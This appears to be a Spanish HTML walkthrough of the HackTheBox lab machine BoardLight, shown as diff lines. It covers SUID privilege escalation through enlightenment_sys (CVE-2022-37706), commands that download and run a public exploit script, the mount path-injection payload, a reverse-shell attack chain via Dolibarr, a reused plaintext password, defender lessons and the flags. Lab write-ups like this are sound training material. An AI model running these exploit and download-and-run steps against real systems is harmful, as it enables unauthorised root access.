+      <p>Los binarios SUID se ejecutan con los privilegios del propietario, no del usuario que los ejecuta. Si el propietario es <code>root</code> y el binario es vulnerable, puede usarse para escalar privilegios. Es uno de los primeros vectores a revisar en Linux.</p>
+    </div>
+    <div class="cmd-annotated">
+      <div class="cmd-line"><span class="user-c">larissa@boardlight$</span> <span class="cmd">enlightenment</span> <span class="flag-opt">--version</span></div>
+      <div class="cmd-line" style="margin-top:.4rem;"><span class="user-c">larissa@boardlight$</span> <span class="cmd">find</span> <span class="param">/usr/lib/x86_64-linux-gnu/enlightenment</span> <span class="flag-opt">-perm -4000</span> <span class="param">2&gt;/dev/null</span></div>
+    </div>
+    <div class="output-box">
+      <div class="output-label">Binarios SUID encontrados</div>
+<pre>Version: <span class="hl">0.23.1</span>
+
+<span class="hl-red">-rwsr-xr-x</span> root root  /usr/lib/x86_64-linux-gnu/enlightenment/utils/<span class="hl">enlightenment_sys</span>
+<span class="hl-red">-rwsr-xr-x</span> root root  /usr/lib/x86_64-linux-gnu/enlightenment/utils/enlightenment_ckpasswd
+<span class="hl-red">-rwsr-xr-x</span> root root  /usr/lib/x86_64-linux-gnu/enlightenment/utils/enlightenment_backlight</pre>
+    </div>
+    <div class="interpret-box">
+      <strong>¿Qué nos dice este output?</strong>
+      <ul>
+        <li><code>enlightenment_sys</code> v0.23.1 con bit SUID y propiedad root</li>
+        <li>CVE-2022-37706 afecta a Enlightenment &lt; 0.25.4 → vulnerable</li>
+        <li>La función mount mal maneja rutas con <code>/dev/..</code> → ejecución arbitraria</li>
+      </ul>
+    </div>
+    <div class="decision-box">
+      <strong>Decisión tomada</strong>
+      <p>Descargar y ejecutar el exploit público de CVE-2022-37706.</p>
+    </div>
+  </div>
+
+  <div class="step-box">
+    <div class="step-number">Paso 8 — Root</div>
+    <h3>CVE-2022-37706 — Path Traversal en enlightenment_sys → Root</h3>
+    <div class="why-box">
+      <strong>¿Cómo funciona la vulnerabilidad?</strong>
+      <p><code>enlightenment_sys</code> llama a <code>/bin/mount</code> con argumentos controlables por el usuario. El binario no sanitiza correctamente rutas con <code>/dev/../tmp/;/tmp/exploit</code>. El shell interpreta el <code>;</code> como separador de comandos, ejecutando <code>/tmp/exploit</code> con privilegios de root.</p>
+    </div>
+    <div class="cmd-annotated">
+      <div class="cmd-line"><span class="comment-c"># Desde Kali: servir exploit</span></div>
+      <div class="cmd-line"><span class="cmd">curl</span> <span class="flag-opt">-s</span> <span class="ip">https://raw.githubusercontent.com/MaherAzzouzi/CVE-2022-37706-LPE-exploit/main/exploit.sh</span> <span class="flag-opt">-o</span> <span class="param">exploit.sh</span></div>
+      <div class="cmd-line"><span class="cmd">python3</span> <span class="flag-opt">-m</span> <span class="param">http.server 8888</span></div>
+      <div class="cmd-line" style="margin-top:.75rem;"><span class="comment-c"># En la máquina como larissa</span></div>
+      <div class="cmd-line"><span class="user-c">larissa@boardlight:/tmp$</span> <span class="cmd">wget</span> <span class="ip">http://10.10.14.154:8888/exploit.sh</span> &amp;&amp; <span class="cmd">chmod</span> <span class="flag-opt">+x</span> <span class="param">exploit.sh</span></div>
+      <div class="cmd-line"><span class="user-c">larissa@boardlight:/tmp$</span> <span class="cmd">bash</span> <span class="param">exploit.sh</span></div>
+    </div>
+    <div class="output-box">
+      <div class="output-label">Output — Root Shell</div>
+<pre>CVE-2022-37706
+[*] Trying to find the vulnerable SUID file...
+[+] Vulnerable SUID binary found!
+[+] Trying to pop a root shell!
+mount: /dev/../tmp/: can't find in /etc/fstab.
+<span class="hl-green"># id</span>
+<span class="hl-green">uid=0(root) gid=0(root) groups=0(root),4(adm),1000(larissa)</span>
+<span class="hl">f6dde27173550dca8eb9e40e154e4894</span></pre>
+    </div>
+    <div class="interpret-box">
+      <strong>¿Qué nos dice este output?</strong>
+      <p>El exploit ejecuta: <code>enlightenment_sys /bin/mount -o noexec,nosuid,...,uid=$(id -u), "/dev/../tmp/;/tmp/exploit" /tmp///net</code>. El directorio <code>/dev/../tmp/;/tmp/exploit</code> hace que el shell ejecute primero <code>/tmp/exploit</code> (que contiene <code>/bin/sh</code>) con privilegios SUID de root.</p>
+    </div>
+  </div>
+</div>
+
+<div class="section">
+  <h2>Diagrama del Ataque</h2>
+  <div class="ascii-diagram">
+<span class="b">┌─────────────────────────────────────────────────────────────────────────────┐</span>
+<span class="b">│                        BOARDLIGHT — ATTACK CHAIN                           │</span>
+<span class="b">└─────────────────────────────────────────────────────────────────────────────┘</span>
+
+<span class="b">KALI</span>                          <span class="o">10.129.23.6 (BoardLight)</span>
+  │                                     │
+  │──── Nmap ──────────────────────────▶│  22/tcp SSH, 80/tcp Apache
+  │                                     │
+  │──── HTTP board.htb ────────────────▶│  Footer: "board.htb"
+  │                                     │
+  │──── ffuf vhost fuzz ───────────────▶│  <span class="g">crm.board.htb → Dolibarr 17.0.0</span>
+  │                                     │
+  │──── admin:admin login ─────────────▶│  <span class="g">Login OK</span>
+  │                                     │
+  │──── CVE-2023-30253 ────────────────▶│  Websites → addcontainer (multipart)
+  │     (&lt;?pHp bypass)                  │  updatesource → PAGE_CONTENT injection
+  │                                     │  Trigger: /public/website/index.php
+  │                                     │         ?website=X&amp;pageref=X
+  │◀──── Reverse Shell ─────────────────│  <span class="r">www-data shell</span>
+  │                                     │
+  │──── cat conf.php ──────────────────▶│  <span class="y">dolibarrowner:serverfun2$2023!!</span>
+  │                                     │
+  │──── SSH larissa:serverfun2$... ────▶│  <span class="g">User Flag: cee91850...</span>
+  │                                     │
+  │──── enlightenment --version ───────▶│  v0.23.1 → CVE-2022-37706
+  │                                     │
+  │──── exploit.sh (SUID abuse) ───────▶│  enlightenment_sys
+  │     /dev/../tmp/;/tmp/exploit       │  mount injection → /bin/sh (root)
+  │                                     │
+  │◀──── uid=0(root) ──────────────────│  <span class="g">Root Flag: f6dde271...</span>
+  │                                     │
+  </div>
+</div>
+
+<div class="section">
+  <h2>Análisis de Vulnerabilidades</h2>
+  <table class="data-table">
+    <tr><th>CVE</th><th>Componente</th><th>Tipo</th><th>Severidad</th><th>Causa raíz</th></tr>
+    <tr>
+      <td><span class="cve-id">CVE-2023-30253</span></td>
+      <td>Dolibarr ≤ 17.0.0</td>
+      <td>RCE Autenticado</td>
+      <td><span class="highlight" style="color:var(--red);">HIGH (8.8)</span></td>
+      <td>Filtro PHP solo bloquea <code>&lt;?php</code> minúsculas</td>
+    </tr>
+    <tr>
+      <td><span class="cve-id">CVE-2022-37706</span></td>
+      <td>Enlightenment ≤ 0.25.3</td>
+      <td>LPE vía SUID</td>
+      <td><span class="highlight" style="color:var(--red);">HIGH (7.8)</span></td>
+      <td><code>enlightenment_sys</code> no sanitiza rutas con <code>/dev/..</code></td>
+    </tr>
+    <tr>
+      <td>—</td>
+      <td>Configuración Dolibarr</td>
+      <td>Credential Exposure</td>
+      <td><span class="highlight" style="color:var(--orange);">MEDIUM</span></td>
+      <td>Contraseña BD en texto plano y reutilizada en cuenta del sistema</td>
+    </tr>
+  </table>
+</div>
+
+<div class="section">
+  <h2>Lecciones Aprendidas</h2>
+  <div class="lessons-grid">
+    <div class="lesson-card attacker">
+      <h4>⚔ Para el Atacante</h4>
+      <ul>
+        <li>Si encuentras Dolibarr, verifica versión: ≤17.0.0 = RCE asegurado</li>
+        <li>El payload <code>&lt;?pHp</code> requiere multipart/form-data, no urlencoded</li>
+        <li>Trigger URL: <code>/public/website/index.php?website=X&amp;pageref=X</code></li>
+        <li>Tras RCE, leer siempre <code>conf.php</code>, <code>config.yml</code>, <code>.env</code></li>
+        <li>Password reuse BD↔SSH es extremadamente común en máquinas Easy/Medium</li>
+        <li>Enlightenment SUID = vector poco conocido pero directo a root</li>
+      </ul>
+    </div>
+    <div class="lesson-card defender">
+      <h4>🛡 Para el Defensor</h4>
+      <ul>
+        <li>Actualizar Dolibarr a ≥ 17.0.1 y deshabilitar el módulo Websites si no se usa</li>
+        <li>Nunca usar <code>admin:admin</code> en producción</li>
+        <li>Usar variables de entorno o secrets manager, no contraseñas en <code>conf.php</code></li>
+        <li>Contraseñas únicas por servicio (sin reuse BD ↔ SSH)</li>
+        <li><code>chmod u-s</code> en binarios de enlightenment si no se usa el desktop</li>
+        <li>Actualizar Enlightenment a ≥ 0.25.4</li>
+      </ul>
+    </div>
+  </div>
+</div>
+
+<div class="section">
+  <h2>MITRE ATT&amp;CK</h2>
+  <table class="data-table">
+    <tr><th>ID</th><th>Técnica</th><th>Descripción en este ataque</th></tr>
+    <tr><td><code>T1046</code></td><td>Network Service Discovery</td><td>Nmap descubriendo SSH y HTTP</td></tr>
+    <tr><td><code>T1190</code></td><td>Exploit Public-Facing App</td><td>CVE-2023-30253 en Dolibarr</td></tr>
+    <tr><td><code>T1078.001</code></td><td>Valid Accounts: Default</td><td>Login con admin:admin</td></tr>
+    <tr><td><code>T1059.004</code></td><td>Command Interpreter: Unix Shell</td><td>Reverse shell como www-data</td></tr>
+    <tr><td><code>T1552.001</code></td><td>Credentials in Files</td><td>Password en conf.php texto plano</td></tr>
+    <tr><td><code>T1021.004</code></td><td>Remote Services: SSH</td><td>Movimiento lateral a larissa</td></tr>
+    <tr><td><code>T1548.001</code></td><td>Abuse Elevation: Setuid</td><td>CVE-2022-37706 enlightenment_sys</td></tr>
+  </table>
+</div>
+
+<div class="flag-box">
+  <div class="flag-label">User Flag</div>
+  <div class="flag-value">cee91850d2ddeb29d21791f805ff79a0</div>
+  <p style="color:var(--text-muted);font-size:0.8rem;margin-top:0.75rem;">/home/larissa/user.txt</p>
+</div>
+
+<div class="flag-box" style="background:linear-gradient(135deg,rgba(0,232,122,.12),rgba(0,232,122,.04));">
+  <div class="flag-label">Root Flag</div>
+  <div class="flag-value">f6dde27173550dca8eb9e40e154e4894</div>
+  <p style="color:var(--text-muted);font-size:0.8rem;margin-top:0.75rem;">/root/root.txt</p>
+</div>
+
+</main>
+
+<aside class="sidebar">
+  <div class="sidebar-card">
+    <h4>Ficha Técnica</h4>
+    <div class="meta-row"><span class="meta-label">Máquina</span><span class="meta-value">BoardLight</span></div>
+    <div class="meta-row"><span class="meta-label">Plataforma</span><span class="meta-value">HackTheBox</span></div>
+    <div class="meta-row"><span class="meta-label">Categoría</span><span class="meta-value">Easy</span></div>
+    <div class="meta-row"><span class="meta-label">OS</span><span class="meta-value">Ubuntu 20.04</span></div>
+    <div class="meta-row"><span class="meta-label">IP</span><span class="meta-value">10.129.23.6</span></div>
+    <div class="meta-row"><span class="meta-label">Puertos</span><span class="meta-value">22, 80</span></div>
+    <div class="meta-row"><span class="meta-label">Servicio clave</span><span class="meta-value">Dolibarr 17.0.0</span></div>
+    <div class="meta-row"><span class="meta-label">Fecha</span><span class="meta-value">2026-04-19</span></div>
+    <div class="meta-row"><span class="meta-label">Tiempo</span><span class="meta-value">~50 min</span></div>
+  </div>
+
+  <div class="sidebar-card">
+    <h4>Herramientas Usadas</h4>
+    <div style="display:flex;flex-direction:column;gap:.4rem;">
+      <div style="display:flex;align-items:center;gap:.5rem;font-size:.82rem;padding:.3rem 0;border-bottom:1px solid var(--border);">
+        <span style="color:var(--green);font-family:var(--mo);font-size:.75rem;">nmap</span>
+        <span style="color:var(--text3);font-size:.75rem;">Port scan + service detection</span>
+      </div>
+      <div style="display:flex;align-items:center;gap:.5rem;font-size:.82rem;padding:.3rem 0;border-bottom:1px solid var(--border);">
+        <span style="color:var(--green);font-family:var(--mo);font-size:.75rem;">ffuf</span>
+        <span style="color:var(--text3);font-size:.75rem;">VHost subdomain fuzzing</span>
+      </div>
+      <div style="display:flex;align-items:center;gap:.5rem;font-size:.82rem;padding:.3rem 0;border-bottom:1px solid var(--border);">
+        <span style="color:var(--green);font-family:var(--mo);font-size:.75rem;">exploit.py</span>
+        <span style="color:var(--text3);font-size:.75rem;">CVE-2023-30253 Dolibarr RCE</span>
+      </div>
+      <div style="display:flex;align-items:center;gap:.5rem;font-size:.82rem;padding:.3rem 0;border-bottom:1px solid var(--border);">
+        <span style="color:var(--green);font-family:var(--mo);font-size:.75rem;">sshpass</span>
+        <span style="color:var(--text3);font-size:.75rem;">SSH con password en CLI</span>
+      </div>
+      <div style="display:flex;align-items:center;gap:.5rem;font-size:.82rem;padding:.3rem 0;">
+        <span style="color:var(--green);font-family:var(--mo);font-size:.75rem;">exploit.sh</span>
+        <span style="color:var(--text3);font-size:.75rem;">CVE-2022-37706 SUID LPE</span>
+      </div>
+    </div>
+  </div>
+
+  <div class="sidebar-card">
+    <h4>MITRE ATT&amp;CK</h4>
+    <span class="mitre-tag">T1046</span>
+    <span class="mitre-tag">T1190</span>
+    <span class="mitre-tag">T1078.001</span>
+    <span class="mitre-tag">T1059.004</span>
+    <span class="mitre-tag">T1552.001</span>
+    <span class="mitre-tag">T1021.004</span>
+    <span class="mitre-tag">T1548.001</span>
+  </div>
+
+  <div class="sidebar-card">
+    <h4>Flags</h4>
+    <div style="background:rgba(96,165,250,.08);border:1px solid rgba(96,165,250,.2);border-radius:8px;padding:.75rem;text-align:center;margin-bottom:.5rem;">
+      <div style="font-size:.6rem;color:var(--text3);text-transform:uppercase;letter-spacing:2px;margin-bottom:.4rem;">USER</div>
+      <div style="font-family:var(--mo);font-size:.7rem;color:var(--blue);word-break:break-all;font-weight:700;">cee91850d2ddeb29d21791f805ff79a0</div>
+    </div>
+    <div style="background:rgba(74,222,128,.08);border:1px solid rgba(74,222,128,.2);border-radius:8px;padding:.75rem;text-align:center;">
+      <div style="font-size:.6rem;color:var(--text3);text-transform:uppercase;letter-spacing:2px;margin-bottom:.4rem;">ROOT</div>
+      <div style="font-family:var(--mo);font-size:.7rem;color:var(--green);word-break:break-all;font-weight:700;">f6dde27173550dca8eb9e40e154e4894</div>
+    </div>
+  </div>
+
+  <div class="sidebar-card">
+    <h4>Cadena de Ataque</h4>
+    <div style="display:flex;flex-direction:column;gap:.35rem;font-size:.73rem;">
+      <div style="background:#050810;border-radius:5px;padding:.4rem .6rem;border-left:2px solid var(--blue);color:var(--text2);font-family:var(--mo);">1. nmap → SSH + Apache</div>
+      <div style="background:#050810;border-radius:5px;padding:.4rem .6rem;border-left:2px solid var(--blue);color:var(--text2);font-family:var(--mo);">2. ffuf → crm.board.htb</div>
+      <div style="background:#050810;border-radius:5px;padding:.4rem .6rem;border-left:2px solid var(--orange);color:var(--text2);font-family:var(--mo);">3. admin:admin → Dolibarr</div>
+      <div style="background:#050810;border-radius:5px;padding:.4rem .6rem;border-left:2px solid var(--red);color:var(--text2);font-family:var(--mo);">4. CVE-2023-30253 → www-data</div>
+      <div style="background:#050810;border-radius:5px;padding:.4rem .6rem;border-left:2px solid var(--yellow);color:var(--text2);font-family:var(--mo);">5. conf.php → larissa creds</div>
+      <div style="background:#050810;border-radius:5px;padding:.4rem .6rem;border-left:2px solid var(--blue);color:var(--text2);font-family:var(--mo);">6. ssh larissa → user flag</div>
+      <div style="background:#050810;border-radius:5px;padding:.4rem .6rem;border-left:2px solid var(--green);color:var(--green);font-family:var(--mo);font-weight:700;">7. CVE-2022-37706 → ROOT ✅</div>
+    </div>
+  </div>
+
+  <div class="sidebar-card">
+    <h4>Ghost-Ops Score</h4>
+    <div class="score-num">7/7</div>
+    <div class="score-label">pasos completados ✅</div>
+    <p style="font-size:0.72rem;color:var(--text3);text-align:center;margin-top:0.5rem;">Cadena Web RCE → SUID Root</p>
+  </div>
+
+  <div class="sidebar-card">
+    <h4>Glosario Rápido</h4>
+    <div class="glosario-item"><span class="glosario-term">Dolibarr</span><span class="glosario-def">ERP/CRM open source. v17.0.0 vulnerable a CVE-2023-30253 (RCE).</span></div>
+    <div class="glosario-item"><span class="glosario-term">VHost</span><span class="glosario-def">Apache sirve apps según header Host. Fuzzing revela subdominios ocultos.</span></div>
+    <div class="glosario-item"><span class="glosario-term">multipart</span><span class="glosario-def">Tipo de POST necesario para el exploit de Dolibarr (no urlencoded).</span></div>
+    <div class="glosario-item"><span class="glosario-term">SUID</span><span class="glosario-def">Bit que hace correr binario como su propietario (root). Vector clásico de privesc.</span></div>
+    <div class="glosario-item"><span class="glosario-term">Password Reuse</span><span class="glosario-def">Misma password en BD y SSH. Práctica insegura común en CTFs.</span></div>
+    <div class="glosario-item"><span class="glosario-term">ffuf</span><span class="glosario-def">Fuzzer en Go ultrarrápido. Usado para subdominios con header Host.</span></div>
+  </div>
+</aside>
+</div>
+
+<!-- ═══ FOOTER ═══ -->
+<footer style="background:var(--forest);border-top:1px solid var(--border);padding:1.5rem;text-align:center;margin-top:3rem;">
+  <p style="color:var(--text3);font-size:.82rem;">HTB · BoardLight · Easy · Linux · Dolibarr + Enlightenment · 2026-04-19</p>
+  <p style="color:var(--text3);font-size:.78rem;margin-top:.35rem;">Reporte generado por <span style="color:var(--green);">kali</span> · Cadena: nmap → ffuf → Dolibarr RCE → conf.php → SSH → SUID enlightenment_sys → root</p>
+</footer>
+
+<script src="https://unpkg.com/three@0.160.0/build/three.min.js"></script>
+<script>
+(function(){
+  var c=document.getElementById('heroOrb');if(!c)return;
+  var r=new THREE.WebGLRenderer({canvas:c,antialias:true,alpha:true});
+  r.setPixelRatio(Math.min(devicePixelRatio,2));r.setSize(260,260,false);
+  var s=new THREE.Scene(),cam=new THREE.PerspectiveCamera(58,1,0.1,100);cam.position.z=7.4;
+  var cfg=[[1.45,3,0.06],[2.1,1,0.03],[2.75,1,0.018]];
+  var sp=cfg.map(function(v){var m=new THREE.Mesh(new THREE.IcosahedronGeometry(v[0],v[1]),new THREE.MeshBasicMaterial({color:0x00e87a,wireframe:true,transparent:true,opacity:v[2]}));s.add(m);return m;});
+  var t=0;(function a(){requestAnimationFrame(a);t+=0.012;sp[0].rotation.y=t*0.35;sp[0].rotation.x=t*0.18;sp[1].rotation.y=-t*0.25;sp[1].rotation.z=t*0.15;sp[2].rotation.y=t*0.15;sp[2].rotation.z=-t*0.1;r.render(s,cam);})();
+})();
+</script>
+</body>
+</html>
